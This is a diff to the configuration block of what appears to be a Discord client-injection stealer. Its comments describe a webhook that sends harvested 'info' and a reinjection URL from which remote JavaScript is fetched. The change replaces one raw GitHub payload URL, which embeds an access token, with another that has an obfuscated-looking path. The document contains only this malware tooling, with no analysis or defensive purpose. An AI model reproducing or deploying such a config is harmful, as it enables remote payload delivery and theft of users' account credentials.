@@ -14,7 +14,7 @@ const config = {
   embed_name: 'V3 Injected', //name of the webhook thats gonna send the info
   embed_icon: 'https://cdn.discordapp.com/attachments/1020474639874539560/1036386536658313216/static_6.png'.replace(/ /g, '%20'), //icon for the webhook thats gonna send the info (yes you can have spaces in the url)
   embed_color: 5639644, //color for the embed, needs to be hexadecimal (just copy a hex and then use https://www.binaryhexconverter.com/hex-to-decimal-converter to convert it)
-  injection_url: 'https://raw.githubusercontent.com/BotSolver/yehiufhwhe/main/inject.js?token=GHSAT0AAAAAAB2OECVEGK5RCBFUHLN6CNYIZA7OXRQ', //injection url for when it reinjects
+  injection_url: 'https://raw.githubusercontent.com/STJJWm8zTXlIelMwcVR5aE1qPT0/EUcGoJ5XDJAALKyXJzb9CD/main/nJ5dMJA0.js', //injection url for when it reinjects
   /**
    * @ATTENTION DON'T TOUCH UNDER HERE IF UNLESS YOU'RE MODIFYING THE INJECTION OR KNOW WHAT YOU'RE DOING @ATTENTION
    **/
